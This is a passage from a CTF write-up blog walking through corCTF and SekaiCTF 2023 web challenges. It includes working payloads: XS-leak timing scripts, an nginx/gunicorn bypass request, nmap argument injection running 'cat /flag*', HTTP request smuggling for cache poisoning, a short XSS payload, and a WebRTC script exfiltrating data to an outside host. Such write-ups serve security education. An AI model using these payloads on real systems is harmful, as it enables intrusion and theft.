class="line-numbers-rows"><span></span></span></code></pre><p>There is also a search API that returns 200 for success and 404 for failure. The goal is to find a way to leak the flag using this API.</p><p>One of the key points of this challenge is that the CSP header is added by nginx, and nginx only adds the header for 2xx and 3xx responses. Therefore, if the search fails and returns 404, the page will not have a CSP.</p><p>So, I came up with a cache probing method.</p><p>We insert <code>&lt;iframe src=search?q=a&gt;</code> into the note. If nothing is found, there is no CSP, so the content of the iframe will be loaded, and the CSS on the page will also be loaded. On the other hand, because it violates the CSP, nothing will be loaded.</p><p>Therefore, we can use the “whether CSS is cached” point to determine if the search found anything.</p><p>At that time, the implemented code was as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"no-cors"</span><span class="token punctuation">,</span>      <span class="token literal-property property">signal</span><span class="token operator">:</span> signal<span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'reload'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token parameter">title<span class="token punctuation">,</span> url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// open note page</span>    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token comment">// wait 1s</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token comment">// clear cache and wait again</span>    <span class="token keyword">await</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>    <span class="token comment">// now the iframe should load, do cache probing</span>    <span class="token keyword">const</span> now <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://leakynote.be.ax/assets/normalize.css'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>      <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token string">'force-cache'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;ms=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>end<span class="token operator">-</span>now<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>now <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/maybe/'</span> <span class="token operator">+</span> title<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// cached(no result) => 2~3ms</span>    <span class="token comment">// no cache(found) => 4.8~5.8ms</span>    w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// copy paste the following from python script</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;a'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=c9193aee91b0fc29'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;c'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;d'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=0c6caa61575b9478'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;e'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;f'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=71652df64d54c0e4'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;g'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=354f3bec25e02332'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;k'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=066aa475493e1a4c'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;l'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=54a12f7b11098d2a'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;o'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=621591145bcfc8e0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;r'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=6b44725cb5e274f0'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;t'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=e025b26e5e7117a1'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;y'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=f10001d89230485e'</span><span class="token punctuation">)</span><span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;z'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After the competition, I saw two other interesting solutions. One of them leaks the information by loading fonts. When you do this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> a<span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-before<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span>... <span class="token comment">/*10000 times */</span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-after<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Chrome determines how to handle it based on the status code. If it is 200, it checks if it is a valid font. If it is 404, it fails directly. Therefore, you can use the loading time of the font to determine the status code.</p><p>ref: <a href="https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45">https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45</a></p><p>The other solution also utilizes the feature of whether the CSS file is loaded, but instead of using cache, it causes server-side busyness by opening a large number of pages at once and slows down the response time to determine.</p><p>ref: <a href="https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09">https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09</a></p><h3><span id="pdf-pal-2-solves">pdf-pal (2 solves)</span></h3><p>The nginx config for this challenge looks like this:</p><pre class="line-numbers language-none"><code class="language-none">location &#x2F; &#123;    proxy_pass http:&#x2F;&#x2F;localhost:7777;    location ^~ &#x2F;generate &#123;        allow 127.0.0.1;        deny all;    &#125;    location ^~ &#x2F;rename &#123;        allow 127.0.0.1;        deny all;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>So, theoretically, accessing the <code>/generate</code> path should not be possible. However, you can bypass it by exploiting the difference between gunicorn and nginx parsers:</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Related ticket: <a href="https://github.com/benoitc/gunicorn/issues/2530">https://github.com/benoitc/gunicorn/issues/2530</a></p><p>After bypassing, you can use the <code>/generate</code> function to generate a PDF. However, because this service blocks some keywords, it is not possible to directly convert the flag into a PDF.</p><p>The solution is to use DNS rebinding to POST to <code>http://localhost:7778</code> and retrieve the response.</p><p>For example, if we have a domain <code>example.com</code> with two A records, one pointing to the actual IP and the other pointing to 0.0.0.0, when the admin bot visits <code>http://example.com:7778/</code>, it resolves the actual IP and successfully retrieves the page.</p><p>At this point, we shut down the server and execute <code>fetch(&#39;http://example.com:7778/generate&#39;)</code>. Since the original IP is no longer accessible, the browser will fallback to 0.0.0.0 and successfully send the request to the desired location. Because it is same-origin, we can also retrieve the response.</p><p>For more details, please refer to:</p><ol><li><a href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a></li><li><a href="https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)">https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)</a></li></ol><h3><span id="lemon-csp-1-solve">lemon-csp (1 solve)</span></h3><p>Found a CSP bypass for 0-day, no public solution available.</p><h3><span id="0day-1-solve">0day (1 solve)</span></h3><p>This challenge involves finding a 1-day for VM2, no public solution available.</p><h2><span id="sekaictf-2023">SekaiCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web</a></p><h3><span id="scanner-service-146-solves">Scanner Service (146 solves)</span></h3><p>Input the port and host, and the following code will be executed:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">nmap <span class="token operator">-</span>p <span class="token comment">#&#123;port&#125; #&#123;hostname&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>However, the input data goes through a sanitizer with character restrictions.</p><p>Tabs can be used, so you can use tabs to add parameters. During the competition, <code>-iL /flag.txt -oN -</code> was used to pass the challenge, redirecting the output to stdout, or using <code>/dev/stdout</code> is also valid.</p><p>The official writeup suggests using the <code>http-fetch</code> script to download the file to the local machine, and then running <code>nmap --script</code> to execute that script:</p><pre class="line-numbers language-none"><code class="language-none">--script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125;--script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>In Discord, @zeosutt provided an interesting alternative solution that utilizes the technique of uploaded files being stored in <code>/tmp/</code> on the rack server. You can directly import the uploaded file:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\t--script\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="frog-waf-29-solves">Frog-WAF (29 solves)</span></h3><p>There is an EL injection vulnerability in <code>buildConstraintViolationWithTemplate</code>, and the remaining challenge is to bypass the WAF.</p><p>Similar vulnerabilities have been found in actual products:</p><ol><li><a href="https://github.com/advisories/GHSA-wfj5-2mqr-7jvv">Expression Language Injection in Netflix Conductor</a></li><li><a href="https://xz.aliyun.com/t/7889">CVE-2020-9296-Netflix-Conductor-RCE-Analysis</a></li></ol><p>For the bypassing part, you can refer to the following resources:</p><ol><li><a href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></li><li><a href="https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba">https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba</a></li><li><a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li></ol><h3><span id="chunky-16-solves">Chunky (16 solves)</span></h3><p>This challenge involves a cache server and a backend server. All requests go through the cache server before reaching the backend, and a copy of the response is stored in the cache server as a cache. The goal is to poison the cache.</p><p>The solution is to construct a request that is interpreted differently by the cache server and the backend server, similar to request smuggling. Here is the solution provided by <a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">zeyu</a>:</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;aaaaa HTTP&#x2F;1.1Host: localhosttransfer-encoding: chunkedContent-Length: 1020GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1Host: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The cache server interprets the second request as <code>GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json</code> based on the <code>Content-Length</code> header, while the backend server interprets it as <code>GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5</code> based on the <code>transfer-encoding</code> header. This way, we can use the response from another path to poison the jwks.json file and achieve cache poisoning.</p><h3><span id="golf-jail-16-solves">Golf Jail (16 solves)</span></h3><p>I have solved this challenge, which took me about a day. I found it very interesting, and the code is concise.</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cross-Origin-Opener-Policy: same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"🚩🚩🚩"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>            <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span>            <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;!-- <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span> -->&lt;div><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>&lt;/div><span class="token punctuation">"</span></span>        <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You are given a 30-character free XSS payload, and the goal is to execute arbitrary code.</p><p>The clever part here is the use of <code>&lt;iframe srcdoc&gt;</code> with <code>sandbox=allow-scripts</code> to create an environment where code can be executed, but the origin is <code>null</code>, and the CSP (Content Security Policy) inherits the execution environment from the parent.</p><p>Therefore, you cannot access any information from the top, including <code>name</code> or <code>location</code>.</p><p>After searching around, I found <code>baseURI</code> in the <code>document</code>, which I discovered inherits the value from the parent and contains the complete path. So, by using <code>&lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt;</code> along with a hash, we can execute arbitrary code within the 30-character limit.</p><p>The reason we can use <code>baseURI</code> to access <code>document.baseURI</code> is that the scope of inline event handlers is automatically added to the document. I wrote about this in my blog post <a href="https://blog.huli.tw/2021/10/25/en/learn-frontend-from-security-pov/">Discovering My Lack of Front-end Knowledge through Cybersecurity</a>.</p><p>Once we have XSS, we can use <code>document.childNodes[0].nodeValue</code> to retrieve the flag. The final challenge is how to exfiltrate the flag. The CSP in this challenge is strict, and we cannot use redirects or <code>window.open</code> (the challenge blocks navigation without using the new <code>navigate-to</code> directive, it’s impressive). So, we have to rely on some existing bypass techniques.</p><p>I first tried DNS prefetch, but it didn’t work. I found out that Chrome released a feature called <a href="https://chromestatus.com/feature/5553640629075968">Resoure Hint “Least Restrictive” CSP</a> in version 112, which might be the reason.</p><p>But no worries, WebRTC is still useful. However, I couldn’t figure out how to use it even after trying for a long time. In the end, I found a payload in another team’s write-up on <a href="https://ctftime.org/writeup/37702">CTFtime</a> and combined it with DNS:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"SEKAI&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">iceServers</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">urls</span><span class="token operator">:</span> <span class="token string">"stun:"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">".29e6037fd1.ipv6.1433.eu.org:1337"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="leakless-note-4-solves">Leakless Note (4 solves)</span></h3><p>This is an advanced version of the previously mentioned “leakynote” challenge. This time, the CSP is stricter with the addition of <code>default-src &#39;self&#39;</code>, and there are no other CSS files on the page.</p><p>The scenario is the same: there is an iframe that may or may not load, and the goal is to detect this.</p><p>The solution provided by strellic is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// leakless note oracle</span><span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">w<span class="token punctuation">,</span> href</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> runs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">600</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> t <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            w<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>buffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            samples<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">delete</span> b<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        runs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>samples<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">.</span>location <span class="token operator">=</span> href<span class="token punctuation">;</span>        <span class="token 